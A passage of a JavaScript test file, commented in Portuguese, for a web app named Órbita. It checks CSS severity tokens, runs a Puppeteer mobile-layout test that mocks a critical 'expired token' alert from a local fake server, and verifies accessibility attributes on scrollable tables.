  // os tokens de gravidade existem no app (e o tema recalcula para as 4 marcas)
  const app = readFileSync(join(WEB, "app", "app.css"), "utf8");
  assert.match(app, /--c-sev-info: #[0-9A-Fa-f]{6}; --c-sev-aten: #[0-9A-Fa-f]{6}; --c-sev-crit: #[0-9A-Fa-f]{6};/);
});

await teste("M39 (navegador): a manchete de Anúncios fica em y ≤ 300 a 390×844 (descontadas as faixas do sistema) e o alerta crítico abre o Radar — roda com ORBITA_QA_NAVEGADOR=1", async () => {
  if (process.env.ORBITA_QA_NAVEGADOR !== "1") { console.log("      (pulado: defina ORBITA_QA_NAVEGADOR=1 para abrir o Chrome)"); return; }
  const { createRequire } = await import("node:module");
  const { spawn } = await import("node:child_process");
  const req = createRequire(join(process.env.ORBITA_PUPPETEER || RAIZ, "x.js"));
  const puppeteer = req("puppeteer-core");
  const chrome = process.env.ORBITA_CHROME || ["C:/Program Files/Google/Chrome/Application/chrome.exe", "/usr/bin/google-chrome", "/usr/bin/chromium"].find(existsSync);
  assert.ok(chrome, "Chrome não encontrado (ORBITA_CHROME)");
  const porta = 4800 + Math.floor(Math.random() * 90);
  const srv = spawn(process.execPath, [join(RAIZ, "scripts", "dev-falso.mjs")], { env: { ...process.env, ORBITA_DEV_FALSO_PORT: String(porta) }, stdio: "ignore", windowsHide: true });
  try {
    await new Promise(r => setTimeout(r, 1800));
    const base = `http://127.0.0.1:${porta}`;
    const browser = await puppeteer.launch({ executablePath: chrome, headless: "new", args: ["--no-sandbox", "--disable-gpu"] });
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 390, height: 844, isMobile: true, hasTouch: true });
      const erros = []; page.on("pageerror", e => erros.push(String(e.message || e)));
      // uma conexão caída (alerta crítico ativo) junto dos alertas de atenção que o dev-falso já traz
      await page.setRequestInterception(true);
      // Injeta na primeira leitura de dados dos Anúncios; ao trocar para Radar a tela reaproveita essa resposta.
      const critico = true;
      page.on("request", async r => {
        if (!critico || !r.url().includes("rpc/nx_dados")) return r.continue();
        try {
          const j = await (await fetch(`${base}/__dev_falso/rest/v1/rpc/nx_dados`, { method: "POST", headers: { "content-type": "application/json" }, body: r.postData() || "{}" })).json();
          j.integracoes = (j.integracoes || []).map(i => (i.canal === "meta" ? { ...i, status: "erro: token expirado" } : i));
          j.alertas = [...(j.alertas || []), { regra: "integracao", chave: "integracao|meta", mensagem: "A conexão com o Meta caiu: o token expirou.", criado_em: new Date().toISOString(), severidade: "critico" }];
          r.respond({ status: 200, contentType: "application/json", headers: { "access-control-allow-origin": "*" }, body: JSON.stringify(j) });
        } catch { r.continue(); }
      });
      await page.goto(`${base}/app/?dev-falso=1&dev=1#/inicio`, { waitUntil: "domcontentloaded" });
      await page.waitForFunction(() => { const b = document.getElementById("boot"); return !b || b.hidden; }, { timeout: 25000 });
      await new Promise(r => setTimeout(r, 1500));
      await page.evaluate(() => { location.hash = "#/anuncios"; });
      await page.waitForSelector(".ads-frase", { timeout: 15000 }).catch(() => {});
      await new Promise(r => setTimeout(r, 1800));
      const m = await page.evaluate(() => {
        const faixas = [...document.querySelectorAll(".faixa")].reduce((s, f) => s + f.getBoundingClientRect().height, 0);
        const fr = document.querySelector(".ads-frase");
        return { topo: fr ? fr.getBoundingClientRect().top + scrollY : null, faixas, chip: !!document.querySelector(".rel-resumo") && document.querySelector(".rel-resumo").getClientRects().length > 0,
          abasEmUmaLinha: (() => { const t = [...document.querySelectorAll(".rel-abas-seg .seg-op")].map(b => Math.round(b.getBoundingClientRect().top)); return new Set(t).size === 1 && t.length === 4; })(),
          sobra: document.documentElement.scrollWidth > innerWidth };
      });
      assert.ok(m.topo !== null, "a manchete existe");
      assert.ok(m.topo - m.faixas <= 300, `a manchete ficou em y=${Math.round(m.topo)} (faixas ${Math.round(m.faixas)} px)`);
      assert.equal(m.chip, true, "chip-resumo visível no celular"); assert.equal(m.abasEmUmaLinha, true, "4 abas numa linha só"); assert.equal(m.sobra, false, "sem rolagem horizontal");
      await page.evaluate(() => { location.hash = "#/anuncios/radar"; });
      await new Promise(r => setTimeout(r, 3500));
      const ordem = await page.evaluate(() => [...document.querySelectorAll(".ads-alertas > li")].filter(li => !li.classList.contains("resolvido")).map(li => li.dataset.sev));
      assert.ok(ordem.length >= 2, "há mais de um alerta ativo"); assert.equal(ordem[0], "critico", "o crítico ativo está no topo");
      assert.deepEqual(ordem, ordem.slice().sort((a, b) => ({ critico: 0, alerta: 1, info: 2 })[a] - ({ critico: 0, alerta: 1, info: 2 })[b]), "ativos do mais grave para o menos");
      assert.deepEqual(erros, []);
    } finally { await browser.close(); }
  } finally { srv.kill(); }
});

await teste("A11Y: tabelas com rolagem horizontal têm região nomeada, foco de teclado visível", () => {
  const rel = ler("web/app/relatorios.js"), ads = ler("web/app/anuncios.js"), css = ler("web/app/relatorios.css");
  assert.match(rel, /class: "rel-tabela-rolagem", role: "region", tabindex: "0", "aria-label": leg/);
  assert.match(ads, /class: "rel-tabela-rolagem", role: "region", tabindex: "0", "aria-label": `Campanhas nos últimos/);
  assert.match(css, /\.rel-tabela-rolagem:focus-visible \{[^}]*outline: 2px solid var\(--c-prim\)/);
});

console.log(`\n${ok} ok · ${falhas} falha(s)`);
if (falhas) process.exit(1);
